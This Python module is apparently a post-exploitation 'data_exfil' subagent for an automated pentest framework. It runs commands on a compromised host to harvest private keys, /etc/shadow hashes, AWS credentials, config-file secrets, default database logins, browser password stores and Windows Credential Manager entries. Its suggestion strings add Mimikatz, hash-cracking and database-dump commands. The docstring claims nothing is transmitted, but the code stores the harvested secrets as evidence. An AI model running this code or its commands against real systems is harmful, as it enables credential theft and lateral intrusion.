"""
data_exfil_subagent.py — Sensitive data discovery and cataloging.

AGENT_NAME  : "post"
SUBAGENT_NAME: "data_exfil"

Methodology:
  1. Find sensitive files: *.conf, *.env, *.pem, *.key, id_rsa, web.config, .aws/credentials
  2. Search databases: MySQL, PostgreSQL, SQLite for data dumps
  3. Enumerate home directories for credential material
  4. Search for backup files, password files, private keys
  5. Catalog browser-saved passwords (Linux/Windows)
  6. Email/mailbox discovery
  7. All discovered files are cataloged as findings — no actual data is transmitted

NOTE: This subagent CATALOGS sensitive data locations for the audit report.
      Actual exfiltration must be authorised by the engagement scope.
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# File patterns
# ---------------------------------------------------------------------------

_CRED_FILE_PATTERNS_LINUX = [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers",
    "~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/authorized_keys",
    "~/.aws/credentials", "~/.aws/config",
    "~/.config/gcloud/credentials.db",
    "/var/www/html/wp-config.php", "/var/www/html/.env",
    "/etc/mysql/debian.cnf", "/etc/postgresql",
]

_KEY_FILE_RE = re.compile(
    r"(BEGIN.*PRIVATE KEY|BEGIN RSA|BEGIN EC|BEGIN DSA|BEGIN OPENSSH)",
    re.IGNORECASE,
)
_PASSWORD_RE = re.compile(
    r"(password|passwd|secret|api_key|access_token|auth_token)\s*[=:]\s*['\"]?(\S{6,})",
    re.IGNORECASE,
)
_DB_CRED_RE = re.compile(
    r"(DB_PASSWORD|DB_USER|MYSQL_ROOT|POSTGRES_PASSWORD|DATABASE_URL)\s*[=:]\s*['\"]?(\S+)",
    re.IGNORECASE,
)
_INTERESTING_FILE_RE = re.compile(
    r"\.(conf|cfg|config|env|ini|xml|json|yaml|yml|bak|backup|sql|dump|key|pem|p12|pfx|ovpn)$",
    re.IGNORECASE,
)


class DataExfilSubagent(BaseSubagent):
    """Discover and catalog sensitive data locations for the audit report."""

    AGENT_NAME: str = "post"
    SUBAGENT_NAME: str = "data_exfil"

    async def run(self, target: str, os_type: str = "linux", **kwargs: Any) -> SubagentResult:
        """
        Enumerate sensitive data locations.

        Parameters
        ----------
        target:
            Compromised host IP or hostname.
        os_type:
            ``"linux"`` or ``"windows"``.

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        if os_type.lower() == "windows":
            await self._enumerate_windows(target)
        else:
            await self._enumerate_linux(target)

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    # ------------------------------------------------------------------
    # Linux data discovery
    # ------------------------------------------------------------------

    async def _enumerate_linux(self, target: str) -> None:
        """Enumerate sensitive data on Linux systems."""

        # ── 1. Private key search ─────────────────────────────────────────
        key_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"find / -maxdepth 8 -name '*.pem' -o -name '*.key' -o -name 'id_rsa' "
                "-o -name 'id_ed25519' -o -name '*.pfx' -o -name '*.p12' 2>/dev/null "
                "| head -30\""
            )},
        )

        key_files = [l.strip() for l in key_output.splitlines() if l.strip()]
        if key_files:
            # Verify which are actual private keys
            for kf in key_files[:5]:
                kf_content = await self.collect_tool(
                    "bash",
                    target,
                    {"options": f"-c \"head -3 '{kf}' 2>/dev/null\""},
                )
                if _KEY_FILE_RE.search(kf_content):
                    await self.store_finding(Finding(
                        title=f"Data Discovery: Private Key File Found — {kf}",
                        description=(
                            f"A private key file was discovered at '{kf}'. "
                            "This may be an SSH private key, TLS certificate key, "
                            "or code signing key providing access to additional systems."
                        ),
                        severity="HIGH",
                        evidence=kf_content[:300],
                        tool="bash",
                        host=target,
                        mitre_technique="T1552.004",
                        exploit_suggestion=(
                            f"Copy key: scp target:{kf} /tmp/found_key && chmod 600 /tmp/found_key. "
                            f"Try SSH: ssh -i /tmp/found_key -o StrictHostKeyChecking=no user@target"
                        ),
                    ))

        # ── 2. Config/env file search ─────────────────────────────────────
        config_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"find /var/www /opt /home /srv /etc /root -maxdepth 6 "
                "\\( -name '*.env' -o -name '.env' -o -name 'wp-config.php' "
                "-o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' "
                "-o -name 'application.properties' -o -name '*.conf' \\) 2>/dev/null "
                "| head -40\""
            )},
        )

        config_files = [l.strip() for l in config_output.splitlines() if l.strip()]
        password_configs = []
        for cf in config_files[:10]:
            cf_content = await self.collect_tool(
                "bash",
                target,
                {"options": f"-c \"cat '{cf}' 2>/dev/null | grep -iE '(password|secret|token|key|user)' | head -10\""},
            )
            if _PASSWORD_RE.search(cf_content) or _DB_CRED_RE.search(cf_content):
                password_configs.append(cf)
                matches = _PASSWORD_RE.findall(cf_content) + _DB_CRED_RE.findall(cf_content)
                await self.store_finding(Finding(
                    title=f"Data Discovery: Credentials in Config File — {cf}",
                    description=(
                        f"Configuration file '{cf}' contains credential material. "
                        f"Found {len(matches)} credential pattern(s). "
                        "These may be database passwords, API keys, or service account credentials."
                    ),
                    severity="HIGH",
                    evidence=cf_content[:800],
                    tool="bash",
                    host=target,
                    mitre_technique="T1552.001",
                    exploit_suggestion=(
                        f"Extract credentials from {cf} for database access, "
                        "credential reuse, or service impersonation."
                    ),
                ))

        # ── 3. /etc/shadow readable check ────────────────────────────────
        shadow_output = await self.collect_tool(
            "bash",
            target,
            {"options": "-c \"cat /etc/shadow 2>/dev/null | head -20\""},
        )

        if shadow_output and ":" in shadow_output and not "Permission denied" in shadow_output:
            hash_lines = [l for l in shadow_output.splitlines() if ":" in l and not l.startswith("#")]
            active_hashes = [l for l in hash_lines if not l.split(":")[1] in ("!", "*", "")]
            await self.store_finding(Finding(
                title=f"Data Discovery: /etc/shadow Readable — {len(active_hashes)} Password Hash(es)",
                description=(
                    f"/etc/shadow is readable by the current user. "
                    f"{len(active_hashes)} account(s) with password hashes found. "
                    "Hashes can be cracked offline with hashcat/john to recover plaintext passwords."
                ),
                severity="CRITICAL",
                evidence="\n".join(hash_lines[:10]),
                tool="bash",
                host=target,
                mitre_technique="T1003.008",
                exploit_suggestion=(
                    "Crack with: john --wordlist=/usr/share/wordlists/rockyou.txt shadow_file "
                    "or hashcat -m 1800 (sha512crypt) / -m 500 (md5crypt)"
                ),
            ))

        # ── 4. AWS credentials ────────────────────────────────────────────
        aws_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"find /root /home -name 'credentials' -path '*/.aws/*' 2>/dev/null "
                "| xargs cat 2>/dev/null | head -20\""
            )},
        )

        if "aws_access_key_id" in aws_output.lower():
            await self.store_finding(Finding(
                title="Data Discovery: AWS Credentials File Found",
                description=(
                    "AWS CLI credentials file(s) found containing access keys. "
                    "These provide programmatic AWS API access with the associated IAM permissions."
                ),
                severity="CRITICAL",
                evidence=aws_output[:500],
                tool="bash",
                host=target,
                mitre_technique="T1552.001",
                exploit_suggestion=(
                    "Configure AWS CLI: export credentials and run "
                    "aws sts get-caller-identity to confirm access. "
                    "Enumerate: aws iam list-attached-user-policies --user-name <user>"
                ),
            ))

        # ── 5. Database dump ──────────────────────────────────────────────
        db_check = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"mysql -u root --password='' -e 'show databases;' 2>/dev/null; "
                "mysql -u root -proot -e 'show databases;' 2>/dev/null; "
                "psql -U postgres -l 2>/dev/null\""
            )},
        )

        if db_check and not re.search(r"(Access denied|FATAL|command not found)", db_check):
            db_names = re.findall(r"\|\s*(\w+)\s*\|", db_check)
            await self.store_finding(Finding(
                title=f"Data Discovery: Database Access Without Password — {len(db_names)} DB(s)",
                description=(
                    f"Database server accessible without authentication or with default credentials. "
                    f"Databases found: {', '.join(db_names[:5]) or 'see evidence'}. "
                    "May contain user records, application data, credentials."
                ),
                severity="CRITICAL",
                evidence=db_check[:1000],
                tool="bash",
                host=target,
                mitre_technique="T1005",
                exploit_suggestion=(
                    "Dump database: mysqldump -u root --all-databases > /tmp/all_dbs.sql. "
                    "Search for credentials: SELECT * FROM users;"
                ),
            ))

        # ── 6. Backup and archive files ───────────────────────────────────
        backup_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"find / -maxdepth 8 "
                "\\( -name '*.bak' -o -name '*.backup' -o -name '*.tar.gz' "
                "-o -name '*.zip' -o -name '*.sql' -o -name '*.dump' \\) "
                "-not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -20\""
            )},
        )

        backup_files = [l.strip() for l in backup_output.splitlines() if l.strip()]
        if backup_files:
            await self.store_finding(Finding(
                title=f"Data Discovery: {len(backup_files)} Backup/Archive File(s) Found",
                description=(
                    f"{len(backup_files)} backup or archive file(s) found on the system. "
                    "These often contain application source code, configuration files, "
                    "database dumps, or credential backups from previous configurations. "
                    f"Files: {', '.join(backup_files[:5])}."
                ),
                severity="MEDIUM",
                evidence=backup_output[:500],
                tool="bash",
                host=target,
                mitre_technique="T1005",
                exploit_suggestion=(
                    "Inspect archives: tar -tzf <file.tar.gz> | head -50. "
                    "Extract: tar -xzf <file.tar.gz> -C /tmp/"
                ),
            ))

    # ------------------------------------------------------------------
    # Windows data discovery
    # ------------------------------------------------------------------

    async def _enumerate_windows(self, target: str) -> None:
        """Enumerate sensitive data on Windows systems."""

        # ── 1. Common credential locations ────────────────────────────────
        cred_search = await self.collect_tool(
            "cmd",
            target,
            {"options": (
                "/c dir /s /b %USERPROFILE%\\.aws\\credentials 2>nul; "
                "dir /s /b C:\\inetpub\\wwwroot\\web.config 2>nul; "
                "dir /s /b C:\\xampp\\htdocs\\*.php 2>nul | findstr /i \"config pass db\" 2>nul; "
                "dir /s /b C:\\*.config 2>nul | head 2>nul"
            )},
        )

        if cred_search.strip():
            await self.store_finding(Finding(
                title="Data Discovery: Windows Sensitive Config Files Located",
                description=(
                    "Configuration and credential files located on the Windows system. "
                    "Review each for database passwords, API keys, and service credentials."
                ),
                severity="MEDIUM",
                evidence=cred_search[:1000],
                tool="cmd",
                host=target,
                mitre_technique="T1552.001",
            ))

        # ── 2. Browser saved passwords ────────────────────────────────────
        browser_check = await self.collect_tool(
            "cmd",
            target,
            {"options": (
                "/c dir \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" 2>nul; "
                "dir \"%APPDATA%\\Mozilla\\Firefox\\Profiles\" 2>nul; "
                "dir \"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data\" 2>nul"
            )},
        )

        browsers_found = [b for b in ("Chrome", "Firefox", "Edge") if b in browser_check]
        if browsers_found:
            await self.store_finding(Finding(
                title=f"Data Discovery: Browser Credential Databases Found — {', '.join(browsers_found)}",
                description=(
                    f"Browser credential database(s) found for: {', '.join(browsers_found)}. "
                    "These SQLite databases contain saved website usernames and passwords. "
                    "Can be decrypted with SharpChrome, HackBrowserData, or LaZagne."
                ),
                severity="HIGH",
                evidence=browser_check[:500],
                tool="cmd",
                host=target,
                mitre_technique="T1555.003",
                exploit_suggestion=(
                    "Run: SharpChrome.exe logins (or) "
                    "python3 HackBrowserData.py -b chrome -o /tmp/browser_creds"
                ),
            ))

        # ── 3. Windows Credential Manager ────────────────────────────────
        wincred_output = await self.collect_tool(
            "cmd",
            target,
            {"options": "/c cmdkey /list 2>&1"},
        )

        stored_creds = [l for l in wincred_output.splitlines()
                        if re.search(r"(Target|User):", l, re.IGNORECASE)]
        if stored_creds:
            await self.store_finding(Finding(
                title=f"Data Discovery: Windows Credential Manager — {len(stored_creds)//2} Stored Credential(s)",
                description=(
                    f"Windows Credential Manager contains stored credentials. "
                    "These can be extracted with Mimikatz (vault::cred), "
                    "providing access to mapped drives, RDP sessions, or web applications."
                ),
                severity="HIGH",
                evidence="\n".join(stored_creds[:20]),
                tool="cmd",
                host=target,
                mitre_technique="T1555.004",
                exploit_suggestion=(
                    "Extract: mimikatz # vault::list && vault::cred "
                    "Or: powershell -c \"[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll()\""
                ),
            ))
